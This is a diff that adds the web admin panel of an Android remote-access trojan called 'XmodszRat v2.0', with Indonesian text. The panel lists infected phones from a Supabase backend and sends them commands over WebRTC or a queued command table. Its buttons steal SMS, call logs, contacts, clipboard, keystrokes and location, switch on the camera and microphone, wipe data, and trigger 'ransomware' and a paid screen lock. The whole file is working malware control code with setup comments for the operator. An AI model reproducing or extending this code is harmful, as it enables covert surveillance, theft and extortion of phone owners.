@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XmodszRat Admin</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family:system-ui; }
+    body { background:#0a0a0a; color:#fff; padding:15px; }
+    .header { font-size:28px; font-weight:bold; color:#00ff88; margin-bottom:20px; }
+    .device-card { background:#1a1a1a; padding:15px; border-radius:12px; display:inline-block; margin:10px 10px 10px 0; width:200px; }
+    .device-name { font-size:18px; font-weight:bold; }
+    .online { color:#0f0; }
+    .control-btn { background:#ff4444; padding:8px; border-radius:8px; text-align:center; margin-top:10px; cursor:pointer; }
+    .grid { display:flex; flex-wrap:wrap; gap:10px; margin:15px 0; }
+    .feature { background:#222; padding:12px; border-radius:8px; width:calc(33% - 10px); text-align:center; cursor:pointer; transition:0.2s; }
+    .feature:hover { background:#333; }
+    .chat-box { background:#111; padding:10px; border-radius:12px; height:150px; overflow-y:auto; margin:10px 0; }
+    .msg-admin { color:#0f0; text-align:right; }
+    .msg-user { color:#f80; text-align:left; }
+    .chat-input { display:flex; gap:10px; margin:10px 0; }
+    .chat-input input { flex:1; padding:12px; border:none; border-radius:10px; background:#222; color:#fff; }
+    .chat-input button { background:#00ff88; padding:12px 20px; border:none; border-radius:10px; font-weight:bold; }
+    .log-box { background:#111; padding:10px; border-radius:12px; height:120px; overflow-y:auto; font-family:monospace; font-size:11px; color:#aaa; }
+    #video-container { margin:15px 0; display:none; }
+    #video-container video { width:100%; max-height:300px; background:#000; border-radius:12px; }
+  </style>
+</head>
+<body>
+  <div class="header">🚀 XmodszRat v2.0</div>
+
+  <div id="deviceList"></div>
+
+  <div class="grid" id="featureGrid">
+    <div class="feature" onclick="sendCmd('get_sms')">📩 SMS</div>
+    <div class="feature" onclick="sendCmd('get_calls')">📞 Call Logs</div>
+    <div class="feature" onclick="sendCmd('start_camera front')">📷 Kamera Depan</div>
+    <div class="feature" onclick="sendCmd('start_camera back')">📸 Kamera Belakang</div>
+    <div class="feature" onclick="sendCmd('get_contacts')">👤 Kontak</div>
+    <div class="feature" onclick="sendCmd('list_files')">📁 File Manager</div>
+    <div class="feature" onclick="sendCmd('lock_screen')">🔒 Lock Screen</div>
+    <div class="feature" onclick="sendCmd('unlock_screen')">🔓 Unlock Screen</div>
+    <div class="feature" onclick="sendCmd('start_keylog')">⌨️ Keylogger</div>
+    <div class="feature" onclick="sendCmd('start_mic')">🎙️ Mic Record</div>
+    <div class="feature" onclick="sendCmd('get_clipboard')">📋 Clipboard</div>
+    <div class="feature" onclick="sendCmd('torch on')">🔦 Senter</div>
+    <div class="feature" onclick="sendCmd('get_location')">📍 Lokasi</div>
+    <div class="feature" onclick="sendCmd('set_wallpaper')">🖼️ Wallpaper</div>
+    <div class="feature" onclick="sendCmd('reset_data')">💣 Reset Data</div>
+    <div class="feature" onclick="sendCmd('ransomware')">💀 Ransomware</div>
+    <div class="feature" onclick="sendCmd('lock_premium')">💰 Lock Premium</div>
+  </div>
+
+  <div id="video-container"><video id="remoteVideo" autoplay playsinline></video></div>
+
+  <h3>💬 Chat</h3>
+  <div class="chat-box" id="chatBox"></div>
+  <div class="chat-input">
+    <input id="chatInput" placeholder="Ketik pesan...">
+    <button onclick="sendChat()">Kirim</button>
+  </div>
+
+  <h3>📋 Logs</h3>
+  <div class="log-box" id="logBox"></div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
+  <script>
+    // ====== GANTI SUPABASE_URL DENGAN PUNYA LU ======
+    const SUPABASE_URL = 'https://your-project.supabase.co'; // <-- GANTI INI
+    const SUPABASE_KEY = 'sb_publishable_r8uOjL7SgzxqjzimofJRrw_TamZDiIh';
+    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    let pc = null;
+    let dc = null;
+    let currentDevice = null;
+
+    async function fetchDevices() {
+      const { data } = await supabase.from('devices').select('*').eq('status', 'online');
+      renderDevices(data);
+    }
+
+    function renderDevices(devices) {
+      const container = document.getElementById('deviceList');
+      container.innerHTML = '<h3>📱 Device Online</h3>';
+      if (!devices || devices.length === 0) {
+        container.innerHTML += '<p style="color:#888;">Belum ada perangkat terhubung</p>';
+        return;
+      }
+      devices.forEach(d => {
+        const card = document.createElement('div');
+        card.className = 'device-card';
+        card.innerHTML = `
+          <div class="device-name">${d.name}</div>
+          <div class="online">● Online</div>
+          <div class="control-btn" onclick="connectTo('${d.id}')">CONTROL</div>
+        `;
+        container.appendChild(card);
+      });
+    }
+
+    async function connectTo(deviceId) {
+      currentDevice = deviceId;
+      addLog(`Connecting to ${deviceId}...`);
+      pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+      dc = pc.createDataChannel('cmd');
+      dc.onopen = () => addLog('Data channel open');
+      dc.onmessage = (e) => handleMessage(e.data);
+
+      pc.ontrack = (e) => {
+        const video = document.getElementById('remoteVideo');
+        video.srcObject = e.streams[0];
+        document.getElementById('video-container').style.display = 'block';
+        video.play();
+      };
+
+      const offer = await pc.createOffer();
+      await pc.setLocalDescription(offer);
+      await supabase.from('signaling').insert({ room: deviceId, type: 'offer', sdp: offer.sdp });
+
+      supabase
+        .channel('signaling_' + deviceId)
+        .on('postgres_changes', {
+          event: 'INSERT',
+          schema: 'public',
+          table: 'signaling',
+          filter: `room=eq.${deviceId}`
+        }, async (payload) => {
+          if (payload.new.type === 'answer') {
+            await pc.setRemoteDescription(new RTCSessionDescription({ type: 'answer', sdp: payload.new.sdp }));
+          }
+        })
+        .subscribe();
+
+      pc.onicecandidate = async (e) => {
+        if (e.candidate) {
+          await supabase.from('signaling').insert({ room: deviceId, type: 'candidate', candidate: JSON.stringify(e.candidate) });
+        }
+      };
+    }
+
+    function sendCmd(cmd) {
+      if (!currentDevice) return alert('Pilih device dulu, kontol!');
+      if (dc && dc.readyState === 'open') {
+        dc.send(cmd);
+        addLog(`Sent: ${cmd}`);
+      } else {
+        supabase.from('commands').insert({ device_id: currentDevice, cmd, status: 'pending' });
+        addLog(`Queued: ${cmd}`);
+      }
+    }
+
+    function handleMessage(msg) {
+      try {
+        const data = JSON.parse(msg);
+        if (data.type === 'chat') {
+          const box = document.getElementById('chatBox');
+          box.innerHTML += `<div class="msg-user">👤 ${data.data}</div>`;
+          box.scrollTop = box.scrollHeight;
+        } else if (data.type === 'location') {
+          addLog(`📍 Lokasi: ${data.data}`);
+        } else {
+          addLog(`📩 ${data.type}: ${JSON.stringify(data.data).slice(0,100)}`);
+        }
+      } catch (e) {
+        addLog(`Raw: ${msg}`);
+      }
+    }
+
+    function sendChat() {
+      const input = document.getElementById('chatInput');
+      const text = input.value.trim();
+      if (!text || !currentDevice) return;
+      sendCmd(`chat ${text}`);
+      const box = document.getElementById('chatBox');
+      box.innerHTML += `<div class="msg-admin">👤 Admin: ${text}</div>`;
+      box.scrollTop = box.scrollHeight;
+      input.value = '';
+    }
+
+    function addLog(text) {
+      const box = document.getElementById('logBox');
+      box.innerHTML += `[${new Date().toLocaleTimeString()}] ${text}\n`;
+      box.scrollTop = box.scrollHeight;
+    }
+
+    // Polling hasil perintah dari client
+    setInterval(async () => {
+      if (!currentDevice) return;
+      const { data } = await supabase.from('commands').select('*').eq('device_id', currentDevice).neq('status', 'done');
+      for (let cmd of data) {
+        if (cmd.result) {
+          addLog(`Result: ${cmd.result}`);
+          await supabase.from('commands').update({ status: 'done' }).eq('id', cmd.id);
+        }
+      }
+    }, 3000);
+
+    fetchDevices();
+    supabase.channel('devices').on('postgres_changes', { event: '*', schema: 'public', table: 'devices' }, fetchDevices).subscribe();
+  </script>
+</body>
+</html>
